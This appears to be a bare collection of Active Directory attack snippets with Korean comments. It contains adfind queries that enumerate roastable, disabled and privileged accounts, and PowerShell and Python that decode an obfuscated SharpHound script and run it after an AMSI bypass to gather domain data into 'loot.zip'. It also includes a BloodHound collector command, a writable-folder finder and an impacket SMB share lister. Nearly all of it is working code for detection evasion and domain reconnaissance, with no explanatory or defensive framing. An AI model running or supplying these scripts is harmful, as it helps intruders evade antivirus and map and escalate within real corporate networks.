adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName
adfind -f "(&(objectcategory=user)(lastLogonTimestamp<=132000000000000000))" sAMAccountName lastLogonTimestamp
adfind -f "memberof=CN=Domain Admins,CN=Users,DC=domain,DC=com" sAMAccountName
adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=64))" sAMAccountName
adfind -f "(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName

$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\SharpHound_Obfuscated.ps1 -Raw)))
$encoded | Out-File .\enc.txt

$content = Get-Content .\enc.txt -Raw
$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
Invoke-Expression $decoded



import subprocess
import base64

# base64 SharpHound 코드 로드
with open("SharpHound_Obfuscated_Base64.txt", "rb") as f:
    b64code = f.read()

decoded = base64.b64decode(b64code).decode("utf-8")

# AMSI Bypass 코드
amsi_bypass = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\
.GetField('amsiInitFailed','NonPublic,Static')\
.SetValue($null,$true)
"""

# 결합 후 실행할 PowerShell 코드
final_script = amsi_bypass + "\n" + decoded + "\nInvoke-BloodHound -CollectionMethod All -ZipFileName loot.zip\n"

# 실행
proc = subprocess.run(
    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-"],
    input=final_script,
    text=True,
    capture_output=True
)

print("[STDOUT]")
print(proc.stdout)
print("[STDERR]")
print(proc.stderr)


bloodhound-python -u <username> -p <password> -d <domain> -dc-ip <dc-ip> -c All



Get-ChildItem -Recurse -Directory | Where-Object {
    $_.Attributes -notmatch 'ReadOnly' -and
    (Test-Path $_.FullName -PathType Container) -and
    (New-Object System.Security.AccessControl.DirectorySecurity).Access | Out-Null
    try {
        $tempFile = [System.IO.Path]::Combine($_.FullName, "___test.txt")
        New-Item $tempFile -ItemType File -Force -ErrorAction Stop | Out-Null
        Remove-Item $tempFile -Force
        $true
    } catch {
        $false
    }
}





from impacket.smbconnection import SMBConnection
import sys

def list_shares(target_ip, username, password, domain='', port=445):
    try:
        smb = SMBConnection(target_ip, target_ip, sess_port=port)
        smb.login(username, password, domain)

        shares = smb.listShares()
        print(f"\n[+] 공유 폴더 목록 for {target_ip}:\n")
        for share in shares:
            print(f"- {share['shi1_netname'].decode('utf-8').strip()}")

        smb.logoff()

    except Exception as e:
        print(f"[-] 오류 발생: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("사용법: python list_shares.py <target_ip> <username> <password> <domain>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    domain = sys.argv[4]

    list_shares(target_ip, username, password, domain)
